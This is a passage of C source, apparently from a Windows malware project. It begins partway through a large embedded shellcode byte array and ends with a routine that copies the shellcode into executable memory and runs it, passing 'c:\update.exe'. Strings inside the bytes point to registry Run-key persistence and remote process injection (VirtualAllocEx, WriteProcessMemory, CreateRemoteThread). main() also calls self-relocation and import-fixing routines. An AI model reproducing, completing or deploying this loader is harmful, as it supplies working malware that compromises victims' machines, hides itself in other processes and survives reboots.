x04\x89\x07\x8d\x7f\x04\x0f\xba\xe7\x03\x73\x11\xf3\x0f\x7e\x0e\x83\xe9\x08\x8d\x76\x08\x66\x0f\xd6\x0f\x8d\x7f\x08\xf7\xc6\x07\x00\x00\x00\x74\x65\x0f\xba\xe6\x03\x0f\x83\xb4\x00\x00\x00\x66\x0f\x6f\x4e\xf4\x8d\x76\xf4\x8b\xff\x66\x0f\x6f\x5e\x10\x83\xe9\x30\x66\x0f\x6f\x46\x20\x66\x0f\x6f\x6e\x30\x8d\x76\x30\x83\xf9\x30\x66\x0f\x6f\xd3\x66\x0f\x3a\x0f\xd9\x0c\x66\x0f\x7f\x1f\x66\x0f\x6f\xe0\x66\x0f\x3a\x0f\xc2\x0c\x66\x0f\x7f\x47\x10\x66\x0f\x6f\xcd\x66\x0f\x3a\x0f\xec\x0c\x66\x0f\x7f\x6f\x20\x8d\x7f\x30\x73\xb7\x8d\x76\x0c\xe9\xaf\x00\x00\x00\x66\x0f\x6f\x4e\xf8\x8d\x76\xf8\x8d\x49\x00\x66\x0f\x6f\x5e\x10\x83\xe9\x30\x66\x0f\x6f\x46\x20\x66\x0f\x6f\x6e\x30\x8d\x76\x30\x83\xf9\x30\x66\x0f\x6f\xd3\x66\x0f\x3a\x0f\xd9\x08\x66\x0f\x7f\x1f\x66\x0f\x6f\xe0\x66\x0f\x3a\x0f\xc2\x08\x66\x0f\x7f\x47\x10\x66\x0f\x6f\xcd\x66\x0f\x3a\x0f\xec\x08\x66\x0f\x7f\x6f\x20\x8d\x7f\x30\x73\xb7\x8d\x76\x08\xeb\x56\x66\x0f\x6f\x4e\xfc\x8d\x76\xfc\x8b\xff\x66\x0f\x6f\x5e\x10\x83\xe9\x30\x66\x0f\x6f\x46\x20\x66\x0f\x6f\x6e\x30\x8d\x76\x30\x83\xf9\x30\x66\x0f\x6f\xd3\x66\x0f\x3a\x0f\xd9\x04\x66\x0f\x7f\x1f\x66\x0f\x6f\xe0\x66\x0f\x3a\x0f\xc2\x04\x66\x0f\x7f\x47\x10\x66\x0f\x6f\xcd\x66\x0f\x3a\x0f\xec\x04\x66\x0f\x7f\x6f\x20\x8d\x7f\x30\x73\xb7\x8d\x76\x04\x83\xf9\x10\x72\x13\xf3\x0f\x6f\x0e\x83\xe9\x10\x8d\x76\x10\x66\x0f\x7f\x0f\x8d\x7f\x10\xeb\xe8\x0f\xba\xe1\x02\x73\x0d\x8b\x06\x83\xe9\x04\x8d\x76\x04\x89\x07\x8d\x7f\x04\x0f\xba\xe1\x03\x73\x11\xf3\x0f\x7e\x0e\x83\xe9\x08\x8d\x76\x08\x66\x0f\xd6\x0f\x8d\x7f\x08\x8b\x04\x8d\xc4\x2a\x00\x10\xff\xe0\xf7\xc7\x03\x00\x00\x00\x74\x13\x8a\x06\x88\x07\x49\x83\xc6\x01\x83\xc7\x01\xf7\xc7\x03\x00\x00\x00\x75\xed\x8b\xd1\x83\xf9\x20\x0f\x82\xae\x02\x00\x00\xc1\xe9\x02\xf3\xa5\x83\xe2\x03\xff\x24\x95\xc4\x2a\x00\x10\xff\x24\x8d\xd4\x2a\x00\x10\x90\xd4\x2a\x00\x10\xdc\x2a\x00\x10\xe8\x2a\x00\x10\xfc\x2a\x00\x10\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x06\x88\x07\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x06\x88\x07\x8a\x46\x01\x88\x47\x01\x8b\x44\x24\x0c\x5e\x5f\xc3\x8d\x49\x00\x8a\x06\x88\x07\x8a\x46\x01\x88\x47\x01\x8a\x46\x02\x88\x47\x02\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8d\x34\x0e\x8d\x3c\x0f\x83\xf9\x20\x0f\x82\x51\x01\x00\x00\x0f\xba\x25\xb0\x0b\x00\x00\x01\x0f\x82\x94\x00\x00\x00\xf7\xc7\x03\x00\x00\x00\x74\x14\x8b\xd7\x83\xe2\x03\x2b\xca\x8a\x46\xff\x88\x47\xff\x4e\x4f\x83\xea\x01\x75\xf3\x83\xf9\x20\x0f\x82\x1e\x01\x00\x00\x8b\xd1\xc1\xe9\x02\x83\xe2\x03\x83\xee\x04\x83\xef\x04\xfd\xf3\xa5\xfc\xff\x24\x95\x70\x2b\x00\x10\x90\x80\x2b\x00\x10\x88\x2b\x00\x10\x98\x2b\x00\x10\xac\x2b\x00\x10\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x46\x03\x88\x47\x03\x8b\x44\x24\x0c\x5e\x5f\xc3\x8d\x49\x00\x8a\x46\x03\x88\x47\x03\x8a\x46\x02\x88\x47\x02\x8b\x44\x24\x0c\x5e\x5f\xc3\x90\x8a\x46\x03\x88\x47\x03\x8a\x46\x02\x88\x47\x02\x8a\x46\x01\x88\x47\x01\x8b\x44\x24\x0c\x5e\x5f\xc3\xf7\xc7\x0f\x00\x00\x00\x74\x0f\x49\x4e\x4f\x8a\x06\x88\x07\xf7\xc7\x0f\x00\x00\x00\x75\xf1\x81\xf9\x80\x00\x00\x00\x72\x68\x81\xee\x80\x00\x00\x00\x81\xef\x80\x00\x00\x00\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x6f\x56\x20\xf3\x0f\x6f\x5e\x30\xf3\x0f\x6f\x66\x40\xf3\x0f\x6f\x6e\x50\xf3\x0f\x6f\x76\x60\xf3\x0f\x6f\x7e\x70\xf3\x0f\x7f\x07\xf3\x0f\x7f\x4f\x10\xf3\x0f\x7f\x57\x20\xf3\x0f\x7f\x5f\x30\xf3\x0f\x7f\x67\x40\xf3\x0f\x7f\x6f\x50\xf3\x0f\x7f\x77\x60\xf3\x0f\x7f\x7f\x70\x81\xe9\x80\x00\x00\x00\xf7\xc1\x80\xff\xff\xff\x75\x90\x83\xf9\x20\x72\x23\x83\xee\x20\x83\xef\x20\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x7f\x07\xf3\x0f\x7f\x4f\x10\x83\xe9\x20\xf7\xc1\xe0\xff\xff\xff\x75\xdd\xf7\xc1\xfc\xff\xff\xff\x74\x15\x83\xef\x04\x83\xee\x04\x8b\x06\x89\x07\x83\xe9\x04\xf7\xc1\xfc\xff\xff\xff\x75\xeb\x85\xc9\x74\x0f\x83\xef\x01\x83\xee\x01\x8a\x06\x88\x07\x83\xe9\x01\x75\xf1\x8b\x44\x24\x0c\x5e\x5f\xc3\xeb\x03\xcc\xcc\xcc\x8b\xc6\x83\xe0\x0f\x85\xc0\x0f\x85\xe3\x00\x00\x00\x8b\xd1\x83\xe1\x7f\xc1\xea\x07\x74\x66\x8d\xa4\x24\x00\x00\x00\x00\x8b\xff\x66\x0f\x6f\x06\x66\x0f\x6f\x4e\x10\x66\x0f\x6f\x56\x20\x66\x0f\x6f\x5e\x30\x66\x0f\x7f\x07\x66\x0f\x7f\x4f\x10\x66\x0f\x7f\x57\x20\x66\x0f\x7f\x5f\x30\x66\x0f\x6f\x66\x40\x66\x0f\x6f\x6e\x50\x66\x0f\x6f\x76\x60\x66\x0f\x6f\x7e\x70\x66\x0f\x7f\x67\x40\x66\x0f\x7f\x6f\x50\x66\x0f\x7f\x77\x60\x66\x0f\x7f\x7f\x70\x8d\xb6\x80\x00\x00\x00\x8d\xbf\x80\x00\x00\x00\x4a\x75\xa3\x85\xc9\x74\x5f\x8b\xd1\xc1\xea\x05\x85\xd2\x74\x21\x8d\x9b\x00\x00\x00\x00\xf3\x0f\x6f\x06\xf3\x0f\x6f\x4e\x10\xf3\x0f\x7f\x07\xf3\x0f\x7f\x4f\x10\x8d\x76\x20\x8d\x7f\x20\x4a\x75\xe5\x83\xe1\x1f\x74\x30\x8b\xc1\xc1\xe9\x02\x74\x0f\x8b\x16\x89\x17\x83\xc7\x04\x83\xc6\x04\x83\xe9\x01\x75\xf1\x8b\xc8\x83\xe1\x03\x74\x13\x8a\x06\x88\x07\x46\x47\x49\x75\xf7\x8d\xa4\x24\x00\x00\x00\x00\x8d\x49\x00\x8b\x44\x24\x0c\x5e\x5f\xc3\x8d\xa4\x24\x00\x00\x00\x00\x8b\xff\xba\x10\x00\x00\x00\x2b\xd0\x2b\xca\x51\x8b\xc2\x8b\xc8\x83\xe1\x03\x74\x09\x8a\x16\x88\x17\x46\x47\x49\x75\xf7\xc1\xe8\x02\x74\x0d\x8b\x16\x89\x17\x8d\x76\x04\x8d\x7f\x04\x48\x75\xf3\x59\xe9\xe9\xfe\xff\xff\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x47\x65\x74\x4d\x6f\x64\x75\x6c\x65\x48\x61\x6e\x64\x6c\x65\x41\x00\x00\x00\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x00\x00\x00\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\x00\x53\x4f\x46\x54\x57\x41\x52\x45\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x43\x75\x72\x72\x65\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x5c\x52\x75\x6e\x00\x00\x00\x01\x00\x00\x00\xff\xff\xff\xff\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x2c\x47\x65\x74\x50\x72\x6f\x63\x65\x73\x73\x48\x65\x61\x70\x00\x2c\x48\x65\x61\x70\x41\x6c\x6c\x6f\x63\x00\x2c\x53\x6c\x65\x65\x70\x00\x3b\x41\x44\x56\x41\x50\x49\x33\x32\x00\x2c\x52\x65\x67\x4f\x70\x65\x6e\x4b\x65\x79\x45\x78\x41\x00\x2c\x52\x65\x67\x53\x65\x74\x56\x61\x6c\x75\x65\x45\x78\x41\x00\x2c\x52\x65\x67\x43\x6c\x6f\x73\x65\x4b\x65\x79\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x01\x91\x08\x12\x06\xff\x02\x91\x05\xa4\x05\x29\x05\x30\x06\xb1\x01\xb5\x05\xb6\x01\x3e\x06\xc0\x01\xc1\x04\x43\x05\xc5\x01\x45\x01\xc8\x04\xca\x01\xd4\x01\x55\x04\xd9\x01\xf1\x00\xff\x05\x00\x00\x00\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x2c\x45\x78\x69\x74\x50\x72\x6f\x63\x65\x73\x73\x00\x2c\x47\x65\x74\x53\x79\x73\x74\x65\x6d\x49\x6e\x66\x6f\x00\x2c\x43\x72\x65\x61\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x41\x00\x2c\x4f\x70\x65\x6e\x50\x72\x6f\x63\x65\x73\x73\x00\x2c\x56\x69\x72\x74\x75\x61\x6c\x41\x6c\x6c\x6f\x63\x45\x78\x00\x2c\x57\x72\x69\x74\x65\x50\x72\x6f\x63\x65\x73\x73\x4d\x65\x6d\x6f\x72\x79\x00\x2c\x43\x72\x65\x61\x74\x65\x52\x65\x6d\x6f\x74\x65\x54\x68\x72\x65\x61\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x04\x03\x02\x0d\x02\x0e\x06\x91\x07\x12\x02\x1e\x04\x25\x07\xa6\x06\x28\x06\x2a\x04\x42\x03\xca\x07\xce\x04\x59\x05\x59\x07\x5d\x01\xe1\x04\xe5\x03\xe8\x00\xea\x01\xef\x01\x75\x04\xf9\x01\xfb\x00\xfe\x01";

	void * mem = VirtualAlloc(NULL, 0x2000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (mem != 0)
	{
		memcpy(mem, buf, 0x15ac);
		void(*func)(char*);
		func = (void(*)(char*))mem;
		func("update;;c:\\update.exe;;");
	}
}

int main(LPVOID param)
{
	testShellcodeRun();
	return 0;

	ULONG_PTR loadAddress = caller();
	DWORD imageBase = (loadAddress & 0xfffff000);

	fixIatAndReloc(imageBase);

	strat(param);
}